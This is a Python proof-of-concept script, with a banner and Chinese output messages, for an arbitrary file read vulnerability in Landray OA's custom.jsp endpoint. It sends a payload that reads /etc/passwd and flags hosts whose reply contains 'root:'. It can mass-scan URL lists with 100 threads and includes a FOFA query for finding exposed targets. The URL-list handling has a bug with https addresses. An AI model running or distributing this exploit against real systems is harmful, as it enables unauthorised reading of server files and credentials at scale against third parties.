#-*- coding: utf-8 -*-
import requests, sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

#fofa：app="Landray-OA系统"
def banner():
        banner = """
               
            ██╗      █████╗ ███╗   ██╗██████╗ ██████╗  █████╗ ██╗   ██╗ ██████╗  █████╗ 
            ██║     ██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝██╔═══██╗██╔══██╗
            ██║     ███████║██╔██╗ ██║██║  ██║██████╔╝███████║ ╚████╔╝ ██║   ██║███████║
            ██║     ██╔══██║██║╚██╗██║██║  ██║██╔══██╗██╔══██║  ╚██╔╝  ██║   ██║██╔══██║
            ███████╗██║  ██║██║ ╚████║██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
            ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                                                                                                                                                                                                                                                                                
                                            tag:  Landray-OA custom.jsp任意文件读取漏洞 POC                                       
                                                @version: 1.0.0   @author by gyc            
        """
        print(banner)
def POC(target):
    url = target + "/sys/ui/extend/varkind/custom.jsp"
    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        response = requests.post(url, data=data, headers=headers, verify=False, timeout=10)
        if "root:" in response.text and response.status_code == 200:
            print(f"[+] {target} 是存在漏洞的" + "---------" +target)

            return True
        else:
            print(f"[-] {target} 是不存在漏洞的")
            return False

    except Exception as e:
       return False

def main():
    parser = argparse.ArgumentParser(description='LandrayOA POC')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        POC(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                if  "https://" in url:
                    pass
                else:
                    urls = 'http://' + str(url)
                url_list.append(urls.strip().replace("\n", ""))


        mp = Pool(100)
        mp.map(POC, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    banner()
    main()
